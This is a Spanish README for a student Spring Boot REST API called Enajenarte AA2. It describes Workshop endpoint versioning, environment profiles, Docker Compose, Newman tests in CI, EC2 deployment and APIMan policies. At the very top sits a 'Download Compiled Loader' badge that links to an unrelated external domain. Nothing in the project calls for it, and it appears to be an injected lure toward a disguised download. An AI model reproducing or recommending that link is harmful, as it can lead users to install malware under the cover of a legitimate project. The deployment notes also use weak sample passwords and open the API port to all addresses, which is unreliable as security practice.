# Enajenarte AA2 - API REST

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

## Descripción general

Este repositorio contiene la versión de la API Enajenarte utilizada para la actividad de aprendizaje de la segunda evaluación de la asignatura **Acceso a Datos**.

El proyecto parte de la API base `enajenarte2.0`. Sobre esa base se han añadido los cambios necesarios para cumplir los requisitos de la actividad.

La API representa el backend de Enajenarte, una empresa centrada en la salud emocional mediante la realización de eventos y tallerse. La API permite gestionar la información principal de la empresa y servir como base para futuras aplicaciones cliente.

Durante esta actividad se han trabajado los siguientes bloques:

- Versionado de una entidad de la API.
- Configuración separada por entornos.
- Ejecución con Docker y Docker Compose.
- Pruebas automatizadas con Postman y Newman.
- Integración de Newman en GitHub Actions.
- Despliegue de la API en AWS EC2.
- Gestión de la API mediante APIMan.

---

## Modelo de dominio

El proyecto trabaja con cinco entidades principales.

### Event

Representa los eventos organizados por Enajenarte.

### Speaker

Representa los ponentes que imparten los talleres y participan en los eventos.

### Workshop

Representa los talleres organizados por Enajenarte.

Se ha elegido esta entidad para aplicar el versionado de la API porque permite demostrar cambios funcionales reales: salida adaptada al cliente, control de duplicados y gestión de conflictos al eliminar talleres con inscripciones asociadas.

### User

Representa los usuarios registrados en la plataforma.

### Registration

Representa la inscripción de un usuario en un taller.

---

## Arquitectura del proyecto

El proyecto mantiene una arquitectura por capas:

```text
controller   -> expone los endpoints REST
service      -> contiene la lógica de negocio
repository   -> acceso a datos con Spring Data JPA
domain       -> entidades persistentes
dto          -> objetos de entrada y salida diferenciados
exception    -> excepciones y gestión centralizada de errores
config       -> configuración del proyecto
```

La intención es mantener una separación clara de responsabilidades:

- Los controladores reciben las peticiones HTTP y devuelven las respuestas.
- Los servicios contienen la lógica de negocio.
- Los repositorios acceden a la base de datos.
- Los DTOs separan los datos internos de los datos expuestos al cliente.
- Las excepciones centralizan los errores y permiten devolver respuestas coherentes.

---

## Tecnologías utilizadas

- Java 21
- Spring Boot
- Maven
- Spring Data JPA
- Hibernate
- MariaDB
- ModelMapper
- Docker
- Docker Compose
- Postman
- Newman
- pnpm
- GitHub Actions
- AWS EC2
- APIMan

---

## Versionado de la API

La entidad versionada en esta actividad es `Workshop`.

La versión original se mantiene en:

```text
/workshops
```

La versión nueva se expone en:

```text
/api/v2/workshops
```

De esta forma se conserva la compatibilidad con la versión inicial y se añade una segunda versión con mejoras funcionales.

### Endpoints versionados

```text
GET    /api/v2/workshops
POST   /api/v2/workshops
PUT    /api/v2/workshops/{id}
DELETE /api/v2/workshops/{id}
```

### Cambios principales en la versión 2

La versión 2 de `Workshop` añade cambios para la respuesta de la API y controlar conflictos de negocio.

En `GET /api/v2/workshops`, la salida se adapta mejor al cliente:

- Se muestra `speakerName` en lugar de mostrar el id del ponente.
- Se incluye `maxCapacity`, porque conocer el aforo de un taller puede ser información útil para una persona interesada en apuntarse a él.
- Se evita exponer datos internos que no aportan valor directo al cliente final.

En `POST /api/v2/workshops`, se añade control de duplicados. 

En `PUT /api/v2/workshops/{id}`, se controla el duplicado durante la edición. 

En `DELETE /api/v2/workshops/{id}`, se impide eliminar un taller con inscripciones asociadas. 

### Criterio de duplicado

Un taller se considera duplicado cuando coincide con otro taller existente en los siguientes datos:

- nombre;
- fecha de inicio;
- modalidad;
- ponente asociado.

Cuando se detecta un duplicado, la API devuelve:

```text
409 Conflict
```

Este código es adecuado porque se trata de un conflicto con el estado actual del sistema.

---

## Gestión de errores

La API gestiona errores mediante excepciones propias y respuestas estructuradas.

Códigos principales utilizados:

| Código | Uso |
|---|---|
| `400 Bad Request` | Datos incorrectos enviados por el cliente |
| `404 Not Found` | Recurso no encontrado |
| `409 Conflict` | Conflicto de negocio, como duplicados o inscripciones asociadas |
| `500 Internal Server Error` | Error interno no controlado |

En la versión 2 de `Workshop`, el código `409 Conflict` se utiliza especialmente para:

- creación de talleres duplicados;
- edición que genera duplicados;
- eliminación de talleres con inscripciones asociadas.

---

## Configuración por entornos

El proyecto separa la configuración en distintos perfiles de Spring:

```text
src/main/resources/application.properties
src/main/resources/application-dev.properties
src/main/resources/application-prod.properties
```

### Perfil `dev`

El perfil `dev` se utiliza para desarrollo local.

```text
API local: http://localhost:8080
MariaDB local desde Docker: localhost:3307
```

Este perfil se utiliza cuando se ejecuta la aplicación desde IntelliJ o desde Maven.

### Perfil `prod`

El perfil `prod` se utiliza para Docker Compose y despliegue.

```text
API Docker: http://localhost:8085
MariaDB dentro de Docker Compose: db:3306
```

Dentro de Docker Compose, la API no se conecta a `localhost`, sino al servicio `db`, porque MariaDB se ejecuta en otro contenedor dentro de la misma red de Docker.

---

## Variables de entorno

El proyecto utiliza variables de entorno para configurar MariaDB:

```env
MARIADB_USER=
MARIADB_PASSWORD=
MARIADB_DATABASE=
MARIADB_ROOT_PASSWORD=
```

Existe un archivo de ejemplo:

```text
.env.sample
```

El archivo real:

```text
.env
```

debe crearse manualmente y no debe subirse a GitHub.

Esto permite mantener separada la configuración sensible del código fuente.

---

## Ejecución local en desarrollo

Para ejecutar la API desde IntelliJ o Maven es necesario tener configuradas las variables de entorno.

En PowerShell:

```powershell
$env:MARIADB_USER="<usuario_mariadb>"
$env:MARIADB_PASSWORD="<password_mariadb>"
$env:MARIADB_DATABASE="enajenarte_aa2_db"
```
Los valores reales deben coincidir con los definidos en el archivo .env local o en los secrets de GitHub. 
Después se puede arrancar la API con:

```powershell
mvn spring-boot:run
```

La API quedará disponible en:

```text
http://localhost:8080
```

Ejemplo de prueba:

```text
GET http://localhost:8080/api/v2/workshops
```

---

## Ejecución con Docker Compose

El proyecto incluye:

```text
Dockerfile
docker-compose.yml
```

Docker Compose levanta dos servicios:

| Servicio | Función |
|---|---|
| `db` | Contenedor MariaDB |
| `api` | Contenedor Spring Boot |

Antes de construir la imagen, se genera el `.jar`:

```powershell
mvn clean package -Dmaven.test.skip=true
```

Después se levanta el entorno completo:

```powershell
docker compose up -d --build
```

En sistemas donde se use el binario clásico de Docker Compose:

```bash
docker-compose up -d --build
```

La API dockerizada queda disponible en:

```text
http://localhost:8085
```

Ejemplo:

```text
GET http://localhost:8085/api/v2/workshops
```

### Comandos útiles de Docker

Ver contenedores activos:

```powershell
docker ps
```

Ver logs:

```powershell
docker compose logs -f
```

Parar contenedores:

```powershell
docker compose down
```

Con Docker Compose clásico:

```bash
docker-compose logs -f
docker-compose down
```

---

## Postman y Newman

El proyecto incluye una colección específica para pruebas automatizadas con Newman:

```text
postman/enajenarte_aa2_workshops_newman.postman_collection.json
```

También incluye un entorno local Docker:

```text
postman/enajenarte_aa2_local_docker.postman_environment.json
```

La variable principal del entorno es:

```text
baseUrl = http://localhost:8085
```

Es importante que esta variable esté guardada en el campo `value` del environment exportado, porque Newman lee el archivo JSON exportado. Si `baseUrl` está vacío, Newman construye URLs incorrectas.

### Instalación de dependencias

Newman está instalado como dependencia de desarrollo mediante `pnpm`.

Para instalar las dependencias:

```powershell
pnpm install
```

### Ejecución de Newman

Para ejecutar la colección:

```powershell
pnpm exec newman run postman/enajenarte_aa2_workshops_newman.postman_collection.json -e postman/enajenarte_aa2_local_docker.postman_environment.json
```

La colección prueba un flujo completo sobre `workshops`, incluyendo:

- creación de speaker auxiliar;
- creación de workshop;
- listado de workshops v2;
- consulta por identificador;
- conflicto por duplicado en POST v2;
- modificación de workshop;
- conflicto por duplicado en PUT v2;
- eliminación de workshop sin inscripciones;
- error 404 tras eliminación;
- creación de usuario auxiliar;
- creación de inscripción;
- conflicto al eliminar workshop con inscripciones.

---

## GitHub Actions

El proyecto incluye un workflow de GitHub Actions para ejecutar Newman automáticamente en cada Pull Request.

Archivo:

```text
.github/workflows/newman.yaml
```

El workflow realiza los siguientes pasos:

1. descarga el repositorio;
2. configura Java 21;
3. configura Node.js y pnpm;
4. instala dependencias;
5. compila la API;
6. levanta Docker Compose;
7. espera a que la API esté disponible;
8. ejecuta la colección Newman;
9. apaga Docker Compose.

### Secrets necesarios

En GitHub se deben configurar los siguientes secrets:

```text
MARIADB_USER
MARIADB_PASSWORD
MARIADB_DATABASE
MARIADB_ROOT_PASSWORD
```

Estos secrets sustituyen al archivo `.env`, que no se sube al repositorio.

---

## Despliegue en AWS

La API se ha desplegado en una instancia EC2 de AWS Academy utilizando Docker y Docker Compose.

Arquitectura desplegada:

```text
EC2 Amazon Linux 2023
 ├── Docker
 ├── Docker Compose
 ├── Contenedor API Spring Boot
 └── Contenedor MariaDB
```

La instancia expone la API en el puerto:

```text
8085
```

El Security Group debe permitir tráfico entrante:

```text
Custom TCP 8085 0.0.0.0/0
```

### Flujo seguido en AWS

En la instancia EC2 se instalaron las herramientas necesarias:

```bash
sudo dnf install -y git docker maven java-21-amazon-corretto-devel
```

Después se inició Docker:

```bash
sudo systemctl start docker
sudo systemctl enable docker
```

Se clonó el repositorio:

```bash
git clone https://github.com/PCaam-git/enajenarteAA2.git
cd enajenarteAA2
git checkout develop
git pull origin develop
```

Se creó manualmente el archivo `.env` en la instancia:

```bash
nano .env
```

Con las variables:

```env
MARIADB_USER=enajenarte_user
MARIADB_PASSWORD=password
MARIADB_DATABASE=enajenarte_aa2_db
MARIADB_ROOT_PASSWORD=root_password
```

Se compiló el proyecto:

```bash
mvn clean package -Dmaven.test.skip=true
```

Y se levantó Docker Compose:

```bash
docker-compose up -d --build
```

La API se comprobó desde Postman con:

```text
GET http://<IP_PUBLICA_EC2>:8085/api/v2/workshops
```

Una respuesta válida puede ser:

```text
204 No Content
```

si la base de datos está vacía.

---

## APIMan

La API también se ha gestionado mediante APIMan.

En esta actividad se ha utilizado APIMan en local con Docker, apuntando a la API real desplegada en AWS.

Flujo:

```text
Postman
  ↓
APIMan Gateway local
  ↓
API desplegada en AWS EC2
  ↓
MariaDB en Docker
```

### Configuración realizada en APIMan

- Organización: `Enajenarte`
- API: `enajenarteApi`
- Plan: `full`
- API real: `http://<IP_PUBLICA_EC2>:8085`
- Client App: `postman client`
- Contrato entre la aplicación cliente y la API publicada
- Generación de API Key

### Políticas configuradas

| Política | Configuración |
|---|---|
| Rate Limiting Policy | 10 peticiones por cliente por minuto |
| Quota Policy | 20 peticiones por aplicación cliente por día |

### Pruebas realizadas

Sin API Key:

```text
403 Forbidden
```

Con API Key:

```text
204 No Content
```

Al superar el límite de peticiones:

```text
429 Too Many Requests
```

Esto confirma que APIMan actúa como gateway y aplica políticas sin modificar el código fuente de la API.

---

## Tests unitarios

El proyecto conserva y actualiza tests unitarios de Controller y Service para las entidades principales:

- `Workshop`
- `Speaker`
- `User`
- `Event`
- `Registration`

Los tests de `Workshop` se han actualizado especialmente para cubrir la entidad versionada de la actividad AA2:

- endpoints clásicos y versionados;
- `GET /api/v2/workshops`;
- `POST /api/v2/workshops`;
- `PUT /api/v2/workshops/{id}`;
- `DELETE /api/v2/workshops/{id}`;
- conflicto por workshop duplicado;
- conflicto al eliminar un workshop con inscripciones asociadas;
- salida v2 con `speakerName` y `maxCapacity`.

También se han actualizado los tests de `Speaker`, `User`, `Event` y `Registration` para ajustarlos a la estructura real actual del proyecto, especialmente al uso de filtrado con `findAll().stream()` en los servicios.

La ejecución completa actual de tests unitarios es correcta:

```text
Tests run: 144, Failures: 0, Errors: 0, Skipped: 0
BUILD SUCCESS
```

### Ejecutar todos los tests

```powershell
mvn test
```

### Ejecutar solo tests de Workshop

En PowerShell, el parámetro debe ir entre comillas porque contiene una coma:

```powershell
mvn test "-Dtest=WorkshopControllerTests,WorkshopServiceTests"
```

### Ejecutar tests por entidad

```powershell
mvn test "-Dtest=SpeakerControllerTests,SpeakerServiceTests"
mvn test "-Dtest=UserControllerTests,UserServiceTests"
mvn test "-Dtest=EventControllerTests,EventServiceTests"
mvn test "-Dtest=RegistrationControllerTests,RegistrationServiceTests"
```

---

## Comandos principales

Compilar y ejecutar tests:

```powershell
mvn clean package
```

Ejecutar todos los tests:

```powershell
mvn test
```

Ejecutar la API en local:

```powershell
mvn spring-boot:run
```

Levantar Docker Compose:

```powershell
docker compose up -d --build
```

Ver contenedores activos:

```powershell
docker ps
```

Ver logs de Docker Compose:

```powershell
docker compose logs -f
```

Parar Docker Compose:

```powershell
docker compose down
```

Ejecutar Newman:

```powershell
pnpm exec newman run postman/enajenarte_aa2_workshops_newman.postman_collection.json -e postman/enajenarte_aa2_local_docker.postman_environment.json
```

En AWS, si se usa Docker Compose clásico:

```bash
docker-compose up -d --build
docker-compose logs -f
docker-compose down
```

---

## Estado final de la actividad

| Bloque | Estado     |
|---|------------|
| Versionado de `Workshop` | Completado |
| Configuración `dev` / `prod` | Completado |
| Dockerfile y Docker Compose | Completado |
| Postman y Newman | Completado |
| GitHub Actions con Newman | Completado |
| Despliegue en AWS EC2 | Completado |
| APIMan Gateway | Completado |
| Actualización de tests unitarios | Completado |

---

## Conclusión

`enajenarteAA2` es una adaptación académica de la API Enajenarte orientada a demostrar versionado de API, configuración por entornos, despliegue con Docker, automatización de pruebas, integración continua, despliegue en AWS y gestión mediante APIMan.

La entidad `Workshop` se ha utilizado como base para aplicar los cambios principales de la actividad, manteniendo la versión original de la API y añadiendo una versión 2 con validaciones y comportamientos adicionales.

Además, el proyecto queda validado mediante dos niveles de pruebas:

- tests unitarios de Controller y Service con Maven;
- tests de integración funcional mediante Postman/Newman y GitHub Actions.

